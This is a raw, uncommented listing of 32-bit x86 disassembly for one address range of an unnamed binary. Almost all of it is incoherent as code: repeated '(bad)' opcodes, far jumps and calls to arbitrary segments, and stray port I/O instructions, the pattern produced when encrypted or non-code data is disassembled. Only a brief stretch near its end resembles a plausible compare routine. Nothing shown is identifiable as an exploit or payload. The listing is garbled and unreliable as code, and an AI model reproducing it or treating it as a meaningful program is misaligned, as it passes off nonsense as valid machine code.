  40e368:	mov    ch,0x3
  40e36a:	sub    ebx,ebp
  40e36c:	inc    eax
  40e36d:	jnp    0x40e354
  40e36f:	test   DWORD PTR [edx],edx
  40e371:	ja     0x40e2f6
  40e373:	fsubr  DWORD PTR [ecx-0x78b4d289]
  40e379:	add    dh,ch
  40e37b:	push   cx
  40e37d:	dec    edi
  40e37e:	inc    edx
  40e37f:	mov    bl,0xc0
  40e381:	loope  0x40e3d5
  40e383:	dec    esi
  40e384:	call   0x3368:0x92e3d5c9
  40e38b:	inc    ebp
  40e38c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e38d:	into   
  40e38e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e38f:	add    bl,BYTE PTR [ebp+0x1d]
  40e392:	push   esi
  40e393:	mov    bh,BYTE PTR [edx]
  40e395:	mov    dl,0x12
  40e397:	or     BYTE PTR ds:[eax+0x6f5773a6],ch
  40e39e:	cmp    DWORD PTR ds:0xa63ed4e9,eax
  40e3a4:	(bad)  
  40e3a6:	imul   edi,DWORD PTR ds:0x8df09f63,0x9e619f96
  40e3b1:	sbb    ah,al
  40e3b3:	jnp    0x40e37d
  40e3b5:	nop
  40e3b6:	das    
  40e3b7:	pop    ss
  40e3b8:	jg     0x40e3c0
  40e3ba:	xor    BYTE PTR [esp+edx*4+0x11],ch
  40e3be:	int    0x81
  40e3c0:	add    BYTE PTR [edx+0x2556aeb5],dl
  40e3c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3c7:	fwait
  40e3c8:	stos   BYTE PTR es:[edi],al
  40e3c9:	xor    edi,DWORD PTR [ecx]
  40e3cb:	hlt    
  40e3cc:	jbe    0x40e3d6
  40e3ce:	inc    esi
  40e3cf:	pushf  
  40e3d0:	dec    ecx
  40e3d1:	into   
  40e3d2:	jne    0x40e3c8
  40e3d4:	xchg   ebx,eax
  40e3d5:	les    edx,FWORD PTR ds:0xa5a9ba6d
  40e3db:	sbb    DWORD PTR [ebx+0x7],edi
  40e3de:	mov    bh,0x78
  40e3e0:	cmp    al,0x37
  40e3e2:	ret    0xc8bf
  40e3e5:	imul   esp,esp,0x3d
  40e3e8:	xor    bl,BYTE PTR [edx-0x15]
  40e3eb:	fidiv  DWORD PTR [edi+0x38]
  40e3ee:	dec    esp
  40e3ef:	jb     0x40e428
  40e3f1:	lds    esp,FWORD PTR [edi+0xd0e865]
  40e3f7:	pop    ecx
  40e3f8:	mul    BYTE PTR [ebp-0x5ad22331]
  40e3fe:	dec    ebx
  40e3ff:	or     dl,ch
  40e401:	test   DWORD PTR [edx+0x60],0xfb6fc917
  40e408:	pop    ss
  40e409:	and    ebx,DWORD PTR [ecx+0x5b]
  40e40c:	or     cl,BYTE PTR [ecx+esi*4]
  40e40f:	mov    WORD PTR [esp-0x2f],fs
  40e413:	int    0x94
  40e415:	add    eax,edi
  40e417:	mov    ebp,0xfdfd7f64
  40e41c:	sar    BYTE PTR [ebx+0x1c3ba54b],0xb
  40e423:	in     al,dx
  40e424:	adc    esi,0xffffffbc
  40e427:	mov    esi,0xd6781d41
  40e42c:	sbb    al,0x47
  40e42e:	cmp    eax,0x3cf7be94
  40e433:	mov    ss,WORD PTR [esi]
  40e435:	inc    ebp
  40e436:	xor    bl,BYTE PTR [edi+ecx*1-0x1f5e7c7a]
  40e43d:	xor    DWORD PTR [bx+di-0x1d],edi
  40e441:	mul    DWORD PTR [esp+ebp*1+0x27]
  40e445:	loop   0x40e3eb
  40e447:	test   eax,0x1d87b9e6
  40e44c:	jns    0x40e400
  40e44e:	sbb    eax,0x3cf2843a
  40e453:	out    0xda,al
  40e455:	sahf   
  40e456:	push   ebp
  40e457:	xor    eax,0xadbec673
  40e45c:	adc    BYTE PTR [eax+0x1279658e],0x7f
  40e463:	lods   eax,DWORD PTR ds:[esi]
  40e464:	cld    
  40e465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e466:	mov    ebx,0x4c3bf7e8
  40e46b:	rcl    DWORD PTR [ebx+0x7b],1
  40e46e:	xchg   ebx,eax
  40e46f:	jmp    0x857e:0xfb861a31
  40e476:	adc    esp,esi
  40e478:	and    dh,cl
  40e47a:	mov    dl,0xe2
  40e47c:	pop    ss
  40e47d:	test   al,0xb4
  40e47f:	sbb    DWORD PTR [edi+0x2bddfeb5],ebx
  40e485:	jl     0x40e4e7
  40e487:	pushf  
  40e488:	retf   
  40e489:	mov    bh,0x17
  40e48b:	nop
  40e48c:	lds    ecx,FWORD PTR [esi+0x272359e6]
  40e492:	pop    ebp
  40e493:	xchg   edx,eax
  40e494:	dec    ebx
  40e495:	or     esp,DWORD PTR [ebx+0x4a35f0b5]
  40e49b:	imul   edx,DWORD PTR [ebx],0xfffffffe
  40e49e:	lahf   
  40e49f:	push   es
  40e4a0:	pop    ecx
  40e4a1:	jecxz  0x40e4b9
  40e4a3:	dec    ebx
  40e4a4:	xchg   ebp,eax
  40e4a5:	inc    esi
  40e4a6:	pop    ds
  40e4a7:	nop
  40e4a8:	pop    ds
  40e4a9:	js     0x40e524
  40e4ab:	cmp    esi,DWORD PTR [ebx-0x3346958]
  40e4b1:	add    al,0xed
  40e4b3:	xor    al,0x11
  40e4b5:	jb     0x40e502
  40e4b7:	mov    cl,0x60
  40e4b9:	ja     0x40e531
  40e4bb:	fucom  st(3)
  40e4bd:	ds inc edx
  40e4bf:	cmp    bh,BYTE PTR [ebp+ebp*8+0x57]
  40e4c3:	sub    esi,DWORD PTR [edx]
  40e4c5:	push   cs
  40e4c6:	adc    ah,BYTE PTR [ebx+esi*4-0x578743ff]
  40e4cd:	call   0x754d5fb0
  40e4d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4d3:	sti    
  40e4d4:	popf   
  40e4d5:	pop    ecx
  40e4d6:	into   
  40e4d7:	adc    edx,edi
  40e4d9:	mov    esi,0x31d54cad
  40e4de:	repz imul BYTE PTR [eax+0x3c362754]
  40e4e5:	div    BYTE PTR [ecx-0x476a86e3]
  40e4eb:	or     BYTE PTR [ecx-0x5b],ah
  40e4ee:	pop    ebx
  40e4ef:	pop    esi
  40e4f0:	sub    al,0x44
  40e4f2:	imul   ecx,ebp,0xffffffe1
  40e4f5:	stc    
  40e4f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4f7:	mov    al,0xcc
  40e4f9:	(bad)  [ebp-0xb]
  40e4fc:	inc    edx
  40e4fd:	ja     0x40e4bb
  40e4ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e500:	clc    
  40e501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e502:	loopne 0x40e4b8
  40e504:	mov    eax,ds:0x113a4595
  40e509:	mov    DWORD PTR [ecx+ecx*2],ebp
  40e50c:	ret    0x19e2
  40e50f:	fsub   DWORD PTR [esi+0x44539591]
  40e515:	test   al,0xa9
  40e517:	xchg   DWORD PTR [ebx-0x3],ebx
  40e51a:	and    al,0xec
  40e51c:	stos   DWORD PTR es:[edi],eax
  40e51d:	adc    DWORD PTR [ebp+ecx*2-0xbb36908],ebp
  40e524:	adc    eax,0x52b0c883
  40e529:	fld    TBYTE PTR [edi+0x4e]
  40e52c:	push   ecx
  40e52d:	(bad)  
  40e52e:	in     al,0x37
  40e530:	test   bh,dh
  40e532:	xchg   BYTE PTR [esi],bh
  40e534:	mov    ds:0xecf70ad9,eax
  40e539:	cmp    esi,0x89aaffb4
  40e53f:	(bad)  
  40e540:	mov    al,0xfc
  40e542:	push   ss
  40e543:	jae    0x40e559
  40e545:	xchg   edi,eax
  40e546:	loop   0x40e4e6
  40e548:	xchg   esp,eax
  40e549:	ds push cs
  40e54b:	xchg   ebx,eax
  40e54c:	dec    esp
  40e54d:	enter  0xcc7,0x63
  40e551:	adc    cl,BYTE PTR [ebx-0x5f]
  40e554:	ror    BYTE PTR [ebx-0x2b],0x25
  40e558:	fld    DWORD PTR [edx-0x9adca6b]
  40e55f:	ret    0xc08b
  40e562:	adc    BYTE PTR [esi-0x260061e2],bl
  40e568:	push   ecx
  40e569:	pop    ebx
  40e56a:	in     al,dx
  40e56b:	cwde   
  40e56c:	aad    0x6e
  40e56e:	pop    esi
  40e56f:	lock add DWORD PTR [ecx+0x4],esi
  40e573:	jecxz  0x40e4ff
  40e575:	and    BYTE PTR [eax],0xb7
  40e578:	xor    bh,BYTE PTR [eax-0x4b29b027]
  40e57e:	xchg   esi,eax
  40e57f:	lods   al,BYTE PTR ds:[esi]
  40e580:	fmul   DWORD PTR [ecx+0x735c806c]
  40e586:	in     eax,0x3b
  40e588:	xchg   edi,eax
  40e589:	dec    eax
  40e58a:	pop    ss
  40e58b:	push   es
  40e58c:	test   eax,0x9acef52a
  40e591:	mov    ch,0xa1
  40e593:	aam    0x8f
  40e595:	push   ebp
  40e596:	jno    0x40e588
  40e598:	xor    eax,ebp
  40e59a:	(bad)  
  40e59c:	pop    ss
  40e59d:	add    BYTE PTR [esi+0x46],0x82
  40e5a1:	mov    al,ds:0x3ec29049
  40e5a6:	clc    
  40e5a7:	fst    QWORD PTR [ecx+0x70316cec]
  40e5ad:	and    ch,ch
  40e5af:	popa   
  40e5b0:	push   esi
  40e5b1:	sbb    DWORD PTR [esi+0x2c],0x2e
  40e5b5:	inc    esp
  40e5b6:	das    
  40e5b7:	(bad)  
  40e5b8:	loopne 0x40e5f4
  40e5ba:	pop    esi
  40e5bb:	sbb    ebp,DWORD PTR [edx]
  40e5bd:	jmp    0x40e55f
  40e5bf:	mov    ecx,0xb95e016
  40e5c4:	cs js  0x40e576
  40e5c7:	xchg   ecx,eax
  40e5c8:	adc    DWORD PTR [ecx+0x721ccfda],eax
  40e5ce:	ficom  WORD PTR [edi-0x659a25f0]
  40e5d4:	xchg   ecx,eax
  40e5d5:	repnz or edi,DWORD PTR [eax-0x62]
  40e5d9:	bound  edx,QWORD PTR [eax+0x6e]
  40e5dc:	xchg   ecx,eax
  40e5dd:	sbb    eax,0xc78f2390
  40e5e2:	mov    DWORD PTR [edx-0x7b],edi
  40e5e5:	dec    esi
  40e5e6:	test   BYTE PTR [esi+0x6d45a32f],bh
  40e5ec:	xchg   edi,eax
  40e5ed:	cmp    BYTE PTR [ecx],ch
  40e5ef:	pop    es
  40e5f0:	imul   ecx,DWORD PTR [ebp+0xba21cf0],0xffffffe4
  40e5f7:	xor    ebp,DWORD PTR ds:0x86c9491d
  40e5fd:	(bad)  
  40e5fe:	xor    al,0xdb
  40e601:	test   eax,0xdb278cca
  40e606:	sub    bh,ah
  40e608:	in     al,0x81
  40e60a:	leave  
  40e60b:	push   edx
  40e60c:	xchg   esp,eax
  40e60d:	out    dx,al
  40e60e:	pop    ebp
  40e60f:	adc    ebp,DWORD PTR [eax]
  40e611:	cli    
  40e612:	stos   BYTE PTR es:[edi],al
  40e613:	xchg   edi,eax
  40e614:	rol    ecx,1
  40e616:	ins    DWORD PTR es:[edi],dx
  40e617:	test   BYTE PTR [ebx+0x25],dh
  40e61a:	and    al,0x1
  40e61c:	int    0xf9
  40e61e:	call   0x8ea8adac
  40e623:	mul    edi
  40e625:	pop    ds
  40e626:	ds call 0xd9bcfe89
  40e62c:	mov    eax,0x4c7d8d6c
  40e631:	cwde   
  40e632:	(bad)
  40e635:	and    esp,DWORD PTR [ebp-0xd211e47]
  40e63b:	jne    0x40e699
  40e63d:	test   DWORD PTR [edi-0x2c3bee9b],eax
  40e643:	outs   dx,BYTE PTR ds:[esi]
  40e644:	inc    esi
  40e645:	mov    bl,BYTE PTR [ebx+0x71]
  40e648:	mov    al,0xc5
  40e64a:	mov    DWORD PTR [ebx+0x32df200a],0x3a223376
  40e654:	jp     0x40e673
  40e656:	push   ds
  40e657:	push   cs
  40e658:	retf   
  40e659:	sub    ch,0x34
  40e65c:	adc    eax,0x400ec288
  40e661:	jns    0x40e5f2
  40e663:	cmp    ebp,eax
  40e665:	pop    ecx
  40e666:	pop    edx
  40e667:	ins    BYTE PTR es:[edi],dx
  40e668:	ret    0xa2cb
  40e66b:	xchg   DWORD PTR [esi*8+0x6b900cac],edx
  40e672:	push   ecx
  40e673:	outs   dx,DWORD PTR ds:[esi]
  40e674:	mov    ch,BYTE PTR ds:0x566bf187
  40e67a:	bnd jne 0x40e646
  40e67d:	aas    
  40e67e:	arpl   WORD PTR [ebp+0x2e49aa0],ax
  40e684:	mov    bl,BYTE PTR [ebx]
  40e686:	lods   al,BYTE PTR ds:[esi]
  40e687:	jmp    0x7f61:0xe5d76b41
  40e68e:	sub    DWORD PTR [esi],eax
  40e690:	lock loopne 0x40e68d
  40e693:	test   al,0x1c
  40e695:	cmp    edx,ebx
  40e697:	ins    BYTE PTR es:[edi],dx
  40e698:	add    DWORD PTR [ecx-0x44],ebx
  40e69b:	adc    al,0x1e
  40e69d:	scas   al,BYTE PTR es:[edi]
  40e69e:	dec    ecx
  40e69f:	xchg   esi,eax
  40e6a0:	test   ch,0x40
  40e6a3:	cld    
  40e6a4:	cmp    ecx,DWORD PTR [ecx-0x77]
  40e6a7:	inc    ebx
  40e6a8:	or     DWORD PTR ds:0x64a9fd73,ebx
  40e6ae:	fimul  WORD PTR [edi]
  40e6b0:	enter  0x8db,0x60
  40e6b4:	jb     0x40e6fd
  40e6b6:	in     al,dx
  40e6b7:	mov    al,0x5d
  40e6b9:	sbb    DWORD PTR [ebp-0x46756a66],ebx
  40e6bf:	mov    ah,0x1e
  40e6c1:	inc    esi
  40e6c2:	push   ss
  40e6c3:	jne    0x40e672
  40e6c5:	jae    0x40e693
  40e6c7:	cdq    
  40e6c8:	fsubr  QWORD PTR [edx-0x40a589d0]
  40e6ce:	daa    
  40e6cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6d0:	jg     0x40e66d
  40e6d2:	jne    0x40e746
  40e6d4:	cmc    
  40e6d5:	mov    DWORD PTR [ecx],eax
  40e6d7:	jmp    0x40ea9d
  40e6dc:	or     ebp,DWORD PTR [edx+0x67]
  40e6df:	aam    0x61
  40e6e1:	(bad)  [ebx+0x4d03ef7d]
  40e6e7:	jns    0x40e6ee
  40e6e9:	mov    esp,0xa16c217c
  40e6ee:	jl     0x40e76c
  40e6f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6f1:	jns    0x40e76f
  40e6f3:	jl     0x40e6e2
  40e6f5:	fiadd  DWORD PTR [edx+0xdf430d9]
  40e6fb:	aam    0x22
  40e6fd:	mov    BYTE PTR [edx-0x3e8a1252],cl
  40e703:	lods   al,BYTE PTR ds:[esi]
  40e704:	pop    ebx
  40e705:	loop   0x40e68f
  40e707:	sbb    eax,0xecdcb3c9
  40e70c:	cmp    al,0x1d
  40e70e:	test   edx,esp
  40e710:	bswap  ebx
  40e712:	fsubr  QWORD PTR [ecx-0x3d8f1de7]
  40e718:	ret    0xef5a
  40e71b:	test   edx,ebp
  40e71d:	push   esi
  40e71e:	xchg   edi,eax
  40e71f:	and    al,0xc9
  40e721:	xchg   DWORD PTR [eax-0x3eec7444],eax
  40e727:	xor    cl,BYTE PTR [eax]
  40e729:	mov    DWORD PTR [edi+0x7f],eax
  40e72c:	cmp    esi,DWORD PTR [edx+0x64cd32ae]
  40e732:	(bad)  
  40e733:	enter  0x1261,0xe3
  40e737:	sub    esp,DWORD PTR [ecx+0x29]
  40e73a:	pop    es
  40e73b:	and    al,0xb2
  40e73d:	add    ah,al
  40e73f:	iret   
  40e740:	je     0x40e6d5
  40e742:	xchg   DWORD PTR [edi],esp
  40e744:	mov    dh,0x59
  40e746:	test   BYTE PTR [edx-0x6a],0x24
  40e74a:	arpl   WORD PTR [esi+eiz*1+0x7921dfb3],bx
  40e751:	mov    ch,BYTE PTR [edi+0x6d]
  40e754:	sbb    eax,0x82a6168d
  40e759:	fcmovne st,st(6)
  40e75b:	mov    al,ds:0x432ff17
  40e760:	pop    es
  40e761:	mov    ecx,0xd115afd0
  40e766:	dec    edi
  40e767:	or     eax,0xa16a7844
  40e76c:	push   0xffffffcf
  40e76e:	adc    DWORD PTR [ebp-0x42],esi
  40e771:	and    al,0xd1
  40e773:	jno    0x40e76e
  40e775:	jle    0x40e74c
  40e777:	and    eax,0x8d6eb
  40e77c:	jmp    0xf9c6:0xff716312
  40e783:	imul   edx,eax,0x65
  40e786:	test   al,0x31
  40e788:	push   esi
  40e789:	loop   0x40e7bc
  40e78b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e78c:	or     DWORD PTR [esi+edi*2],edi
  40e78f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e790:	call   0xd4e2:0x94a61421
  40e797:	mov    ds:0xeb2e0813,eax
  40e79c:	retf   0xe061
  40e79f:	loope  0x40e7cb
  40e7a1:	xlat   BYTE PTR fs:[ebx]
  40e7a3:	into   
  40e7a4:	mov    esp,0x3b8c5432
  40e7a9:	inc    esi
  40e7aa:	push   0xab6f51eb
  40e7af:	gs inc ebx
  40e7b1:	sti    
  40e7b2:	mov    bh,BYTE PTR [eax+0x65052384]
  40e7b8:	pop    esp
  40e7b9:	clc    
  40e7ba:	hlt    
  40e7bb:	and    ecx,DWORD PTR [eax+0x54bad770]
  40e7c1:	sub    eax,0x82f3ac5d
  40e7c6:	pop    ecx
  40e7c7:	jmp    0x7a916558
  40e7cc:	xchg   edx,eax
  40e7cd:	into   
  40e7ce:	mov    esi,0x4957bc8a
  40e7d3:	mov    dh,dl
  40e7d5:	sub    esp,DWORD PTR [edi+0x7a381ff6]
  40e7db:	and    BYTE PTR [edi+0x43],0x55
  40e7df:	and    DWORD PTR [edx],eax
  40e7e1:	pop    esp
  40e7e2:	out    0xdb,al
  40e7e4:	jmp    0x4340:0xbe27f5e9
  40e7eb:	(bad)  
  40e7ec:	or     ch,BYTE PTR [edx+ebx*2]
  40e7ef:	pusha  
  40e7f0:	or     al,0x2d
  40e7f2:	pop    edx
  40e7f3:	cdq    
  40e7f4:	and    esi,DWORD PTR [edx-0x1e]
  40e7f7:	jecxz  0x40e833
  40e7f9:	vpsubusb xmm5,xmm0,XMMWORD PTR [edi]
  40e7fd:	adc    eax,0x9cf48a3
  40e802:	push   ebp
  40e803:	js     0x40e86c
  40e805:	sub    eax,0xeda9267a
  40e80a:	addr16 or al,0xa4
  40e80d:	popf   
  40e80e:	or     DWORD PTR [edx],ebx
  40e810:	sub    DWORD PTR [eax],esp
  40e812:	dec    edx
  40e813:	rcr    DWORD PTR [ebx-0x24],0x64
  40e817:	test   al,0xc
  40e819:	xor    al,0x74
  40e81b:	xor    eax,0x82fc7153
  40e820:	cli    
  40e821:	adc    ecx,DWORD PTR [ebp+ebx*2-0x55e98495]
  40e828:	ja     0x40e7cb
  40e82a:	(bad)  
  40e82c:	jmp    0x47b5:0x56881471
  40e833:	dec    ebp
  40e834:	sub    BYTE PTR [eax],ah
  40e836:	dec    ebx
  40e837:	in     al,0xb7
  40e839:	or     eax,0x5ba53bc6
  40e83e:	xor    DWORD PTR [edi-0x79d3de42],ebx
  40e844:	pop    esp
  40e845:	pushf  
  40e846:	push   ds
  40e847:	xchg   edi,eax
  40e848:	mov    al,0xe9
  40e84a:	mov    eax,0x2aa5b42
  40e84f:	and    al,0xe4
  40e851:	sbb    ecx,DWORD PTR [ebx-0x24]
  40e854:	adc    ebx,DWORD PTR [edx]
  40e856:	inc    esp
  40e857:	mov    bh,0xc0
  40e859:	xchg   edi,eax
  40e85a:	ficom  WORD PTR [esi+0x53]
  40e85d:	loopne 0x40e8db
  40e85f:	xor    eax,0xf0dcc0ef
  40e864:	pop    edx
  40e865:	push   es
  40e866:	push   ds
  40e867:	test   ebx,esp
  40e869:	stos   BYTE PTR es:[edi],al
  40e86a:	in     al,dx
  40e86b:	push   ss
  40e86c:	aad    0xa7
  40e86e:	stos   DWORD PTR es:[edi],eax
  40e86f:	sub    edi,ebx
  40e871:	xstore-rng (bad)
  40e872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e873:	inc    ebp
  40e874:	sbb    ch,BYTE PTR [ebp+0x1]
  40e877:	outs   dx,BYTE PTR ds:[esi]
  40e878:	test   eax,0x15a55e25
  40e87d:	out    dx,eax
  40e87e:	or     al,0x43
  40e880:	adc    DWORD PTR [edx+eax*2+0x44f1d51e],esi
  40e887:	(bad)
  40e88b:	out    0x3c,eax
  40e88d:	dec    ebp
  40e88e:	mov    esp,0xc957abbe
  40e893:	shl    BYTE PTR [edx+ebp*8],0xa9
  40e897:	retf   
  40e898:	ret    
  40e899:	data16 scas al,BYTE PTR es:[edi]
  40e89b:	sbb    BYTE PTR [ebx],dh
  40e89d:	test   BYTE PTR [edx-0x1f],ah
  40e8a0:	push   0x5f
  40e8a2:	cld    
  40e8a3:	int3   
  40e8a4:	loopne 0x40e8c1
  40e8a6:	cmp    edi,DWORD PTR [ebx]
  40e8a8:	jge    0x40e843
  40e8aa:	sbb    BYTE PTR [edx-0x535201e0],ch
  40e8b0:	leave  
  40e8b1:	xor    edi,DWORD PTR [edx]
  40e8b3:	sbb    al,0x4e
  40e8b5:	push   es
  40e8b6:	sti    
  40e8b7:	mov    ds:0x6620b29e,al
  40e8bc:	xchg   esp,eax
  40e8bd:	mov    ds:0xb192a12a,al
  40e8c2:	lahf   
  40e8c3:	pop    ecx
  40e8c4:	pop    esp
  40e8c5:	mov    ds:0xf372288b,al
  40e8ca:	call   0xc81844ce
  40e8cf:	dec    ebx
  40e8d0:	add    BYTE PTR [ebp+0x2a6a58de],dl
  40e8d6:	push   esi
  40e8d7:	mov    eax,ds:0xe9ce7bce
  40e8dc:	xchg   ecx,eax
  40e8dd:	int3   
  40e8de:	xor    ecx,edi
  40e8e0:	jmp    0xc6c3:0x41728464
  40e8e7:	push   ebx
  40e8e8:	out    dx,eax
  40e8e9:	adc    edi,DWORD PTR [edi+0x4]
  40e8ec:	cli    
  40e8ed:	lods   eax,DWORD PTR ds:[esi]
  40e8ee:	xchg   edx,eax
  40e8ef:	mov    ds:0x33bef479,eax
  40e8f4:	pop    ebx
  40e8f5:	ss mov ebp,0x41a3017f
  40e8fb:	dec    esp
  40e8fc:	test   DWORD PTR [eax],esi
  40e8fe:	icebp  
  40e8ff:	push   ecx
  40e900:	mov    ebp,0x21567362
  40e905:	mov    al,0x40
  40e907:	cmp    cl,dh
  40e909:	xchg   ebp,eax
  40e90a:	adc    eax,0x71b23e04
  40e90f:	or     eax,0x1e2a539e
  40e914:	outs   dx,BYTE PTR ds:[esi]
  40e915:	push   es
  40e916:	dec    esp
  40e917:	(bad)  
  40e919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e91a:	add    eax,0x6fd637ee
  40e91f:	cld    
  40e920:	stos   BYTE PTR es:[edi],al
  40e921:	scas   al,BYTE PTR es:[edi]
  40e922:	or     eax,0xba12b488
  40e927:	in     al,dx
  40e928:	aam    0x85
  40e92a:	in     al,dx
  40e92b:	imul   edx,DWORD PTR [esi+0xefd0888],0xffffffaa
  40e932:	or     al,0x30
  40e934:	jns    0x40e9b3
  40e936:	sub    BYTE PTR [ecx+0x55],cl
  40e939:	push   edx
  40e93a:	push   edx
  40e93b:	add    eax,0xd1475b24
  40e940:	mov    esp,0x878d5a0d
  40e945:	push   cs
  40e946:	jmp    0x40e8dc
  40e948:	xchg   edi,eax
  40e949:	sub    BYTE PTR [eax+eiz*1-0x292c574a],0x55
  40e951:	dec    ebx
  40e952:	call   0xa5061e27
  40e957:	push   edi
  40e958:	inc    esi
  40e959:	cmp    edx,DWORD PTR [eax+0x2a]
  40e95c:	outs   dx,BYTE PTR ss:[esi]
  40e95e:	cmp    ebx,eax
  40e960:	mov    edx,0x6a3117d0
  40e965:	in     al,dx
  40e966:	push   ebp
  40e967:	mov    edx,0xb4ca735
  40e96c:	loop   0x40e91d
  40e96e:	lods   al,BYTE PTR ds:[esi]
  40e96f:	jge    0xb4200ba1
  40e975:	xchg   ecx,eax
  40e976:	pushf  
  40e977:	jne    0x40e983
  40e979:	mov    dh,BYTE PTR [esi]
  40e97b:	sub    BYTE PTR [ebp+ebx*1-0x4e69ec3c],al
  40e982:	jbe    0x40e9b0
  40e984:	jns    0x40e94a
  40e986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e987:	cdq    
  40e988:	loop   0x40e97a
  40e98a:	cmc    
  40e98b:	pop    ss
  40e98c:	pop    edi
  40e98d:	xor    DWORD PTR [ecx+0x7a],0xe2bf45ab
  40e994:	neg    BYTE PTR [esi+0x4c6d07f5]
  40e99a:	fst    st(0)
  40e99c:	or     ah,cl
  40e99e:	retfw  0x9865
  40e9a2:	and    al,0x92
  40e9a4:	push   ebx
  40e9a5:	(bad)  
  40e9a6:	xchg   ebx,eax
  40e9a7:	dec    ecx
  40e9a8:	or     eax,0xc310a1cf
  40e9ad:	inc    edx
  40e9ae:	popf   
  40e9af:	pop    ebx
  40e9b0:	loope  0x40ea18
  40e9b2:	into   
  40e9b3:	movzx  edx,WORD PTR [edx+0x27a137d3]
  40e9ba:	pop    eax
  40e9bb:	ins    BYTE PTR es:[edi],dx
  40e9bc:	push   ds
  40e9bd:	das    
  40e9be:	add    DWORD PTR [ebx],ecx
  40e9c0:	ds jg  0x40e97d
  40e9c3:	sub    DWORD PTR [eax+eax*4+0x58dc021a],esp
  40e9ca:	adc    DWORD PTR [edx-0x5501b7dd],esp
  40e9d0:	xchg   edx,eax
  40e9d1:	mov    ebp,0x90671326
  40e9d6:	mov    ebp,0x76b78361
  40e9db:	mov    ch,0x36
  40e9dd:	and    ebx,DWORD PTR [ecx+0x7c]
  40e9e0:	add    al,0x1c
  40e9e2:	adc    bh,BYTE PTR [esi]
  40e9e4:	push   cs
  40e9e5:	aaa    
  40e9e6:	adc    BYTE PTR [edi+ecx*8],al
  40e9e9:	cwde   
  40e9ea:	dec    esi
  40e9eb:	cmp    ecx,edi
  40e9ed:	xor    esp,DWORD PTR [edx-0x41ae0d30]
  40e9f3:	stos   DWORD PTR es:[edi],eax
  40e9f4:	pop    ecx
  40e9f5:	mov    WORD PTR [eax+0x34],?
  40e9f8:	xor    al,0x62
  40e9fa:	adc    ebx,DWORD PTR [esi+0x76]
  40e9fd:	xor    dl,dh
  40e9ff:	sar    DWORD PTR gs:[ebx-0x33],0xf6
  40ea04:	mov    al,0x16
  40ea06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea07:	mov    esp,0xfa34e32a
  40ea0c:	jecxz  0x40e9fa
  40ea0e:	nop
  40ea0f:	pop    esi
  40ea10:	push   esi
  40ea11:	in     eax,dx
  40ea12:	test   eax,0xe014c7c5
  40ea17:	jno    0x40e99d
  40ea19:	sbb    dh,BYTE PTR ds:0xcceea56b
  40ea1f:	sub    dh,BYTE PTR [eax-0x65]
  40ea22:	fs mov bl,0x2
  40ea25:	stos   DWORD PTR es:[edi],eax
  40ea26:	adc    ebx,DWORD PTR [ecx+0x515539ed]
  40ea2c:	jl     0x40e9f7
  40ea2e:	jp     0x40ea46
  40ea30:	add    eax,0x102cdacc
  40ea35:	mov    ecx,0x514dc1
  40ea3a:	mov    bh,0x6a
  40ea3c:	xchg   edx,eax
  40ea3d:	sahf   
  40ea3e:	retf   0x189
  40ea41:	push   eax
  40ea42:	xor    DWORD PTR [ecx-0x65fc3b46],ecx
  40ea48:	dec    ebp
  40ea49:	push   0x6d779512
  40ea4e:	cmp    BYTE PTR ds:0xe2bcdf33,bh
  40ea54:	(bad)  
  40ea55:	out    0x7c,al
  40ea57:	stos   DWORD PTR es:[edi],eax
  40ea58:	repz push ebp
  40ea5a:	inc    ecx
  40ea5b:	jge    0x40ea37
  40ea5d:	jmp    0x79c7:0x52a1be02
  40ea64:	out    dx,al
  40ea65:	xchg   BYTE PTR [ebx],ah
  40ea67:	xor    edx,DWORD PTR [ecx+0x4f]
  40ea6a:	xchg   edx,eax
  40ea6b:	jle    0x40ea9c
  40ea6d:	mov    ebp,0x2711d50e
  40ea72:	ds mov dh,al
  40ea75:	sub    DWORD PTR [ebx+0x318e7a29],ebx
  40ea7b:	popa   
  40ea7c:	or     edx,eax
  40ea7e:	inc    eax
  40ea7f:	mov    ah,0xe6
  40ea81:	fsubp  st(2),st
  40ea83:	cmp    ch,BYTE PTR [ebx-0x2f73f531]
  40ea89:	lods   eax,DWORD PTR ds:[esi]
  40ea8a:	sbb    ch,BYTE PTR gs:[edx-0x6781a637]
  40ea91:	imul   ebp,DWORD PTR [esi+0x6f4d8442],0x6e1a3795
  40ea9b:	sbb    eax,0xf8458b5a
  40eaa0:	jmp    0x40f269
  40eaa5:	mov    eax,DWORD PTR [ebp-0x4]
  40eaa8:	mov    ecx,DWORD PTR [ebp+0x10]
  40eaab:	xor    eax,edi
  40eaad:	add    eax,esi
  40eaaf:	cmp    eax,ecx
  40eab1:	jne    0x40f266
  40eab7:	mov    eax,DWORD PTR [ebp-0x4]
  40eaba:	xor    eax,edi
  40eabc:	add    eax,esi
  40eabe:	jmp    0x40ee84
  40eac3:	icebp  
  40eac4:	jmp    0x40ea54
  40eac6:	imul   edx,DWORD PTR [edx+0x1973f175],0xa383fe94
  40ead0:	add    bh,0x4
  40ead3:	xchg   edi,eax
  40ead4:	lods   eax,DWORD PTR ds:[esi]
  40ead5:	jl     0x40eb53
  40ead7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ead8:	jns    0x40eb56
  40eada:	jl     0x40eaaa
  40eadc:	mov    dh,0x2d
  40eade:	imul   esi,ecx,0x1f4f7e50
  40eae4:	out    0xef,eax
  40eae6:	xchg   esp,esi
  40eae8:	call   0x571c:0xca23e2eb
  40eaef:	loopne 0x40ea78
  40eaf1:	lods   al,BYTE PTR ds:[esi]
